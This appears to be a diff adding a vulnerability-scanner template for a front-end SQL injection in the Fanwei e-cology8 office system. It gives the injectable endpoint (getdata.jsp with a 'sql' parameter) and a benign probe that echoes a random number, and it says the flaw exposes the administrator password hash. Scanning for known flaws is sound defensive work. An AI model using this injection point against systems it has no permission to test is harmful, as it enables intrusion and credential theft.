@@ -1,0 +1,27 @@
+id: ecology-v8-sqli
+info:
+  name: Fanwei e-cology8 Frontend SQL Injection
+  author:
+  - l0ne1y
+  description: |-
+    Fanwei e-cology8 Frontend SQL Injection
+    SQL is a database query and programming language used to store data and to query, update, and manage relational database systems; it is also the file extension of database scripts.
+    Web programs typically use SQL commands to query and update database data. Such queries or updates usually involve conditions that are filled in by users. Malicious users can modify these conditions to execute malicious SQL commands to obtain or update database data. Even worse, if the database account has high privileges, attackers can inject malicious SQL commands to call special database functions to read/write files on the server or execute operating system commands.
+    Fanwei ecology8 is an OA office product, but ecology8 has a front-end SQL injection that can obtain the system administrator password hash.
+  severity: high
+  remediation: |-
+    #### Official remediation:
+    Upgrade the system to a version without the vulnerability, or download the security patch from the official website.
+requests:
+- matchers:
+  - type: word
+    part: body
+    words:
+    - '{{randomValue}}'
+  path:
+  - '{{BaseURL}}/js/hrm/getdata.jsp?cmd=getSelectAllId&sql=select+{{randomValue}}+as+id'
+  method: GET
+  headers:
+    Host: '{{Hostname}}'
+variables:
+  randomValue: '{{rand_int(200000000, 210000000)}}'
